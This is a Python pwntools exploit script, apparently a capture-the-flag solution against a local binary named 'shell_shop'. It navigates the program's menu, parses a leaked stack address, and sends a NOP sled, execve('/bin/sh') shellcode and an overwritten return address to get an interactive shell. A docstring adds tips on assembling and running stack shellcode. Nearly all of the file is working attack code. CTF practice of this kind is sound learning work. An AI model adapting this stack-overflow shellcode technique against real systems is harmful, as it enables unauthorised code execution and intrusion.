#!/usr/bin/python
import sys
import struct
from pwn import *

"""
    Building shellcode with nasm:
    nasm -f bin shellcode.asm -o shellcode.bin

    Must have BITS 64 at the top of the shellcode file,
    otherwise nasm will assume its 16-bit with -f bin

    Lesson about shellcode on the stack:
    If you execute shellcode on the stack, don’t leave rsp pointing into the middle of your code.
    Many shellcodes start with a sub rsp, 0xNN just for this reason.
"""

# execve("/bin/sh")
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

context.log_level = 'error'

e = ELF("./shell_shop")
libc = ELF("./glibc/libc.so.6")
p = process(e.path)
# p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

print(f"Received: {p.recvuntil(b'>> ')}")

print("Buying X0 Armor")
p.sendline(b'2')

print(f"Received: {p.recvuntil(b'>> ')}")

print("Exiting shop")
p.sendline(b'3')

print(f"Received: {p.recvline()}")

# address is the start of my payload on the stack
leaked_addr = int(p.recvline().split(b"[")[1].split(b"]")[0], 16)
print(f"Got leaked address: {hex(leaked_addr)}")

print(f"Received: {p.recvuntil(b'(y/n): ')}")

payload_len = 58
num_nops = payload_len - len(shellcode)
print(f"Prepending payload with nopsled of len {num_nops}")

payload = b'\x90'*num_nops
payload += shellcode

# Jump to start of buffer
payload += p64(leaked_addr)

print("Sending payload 1")
p.sendline(payload)

# grab stdin/stdout of shell
p.interactive()
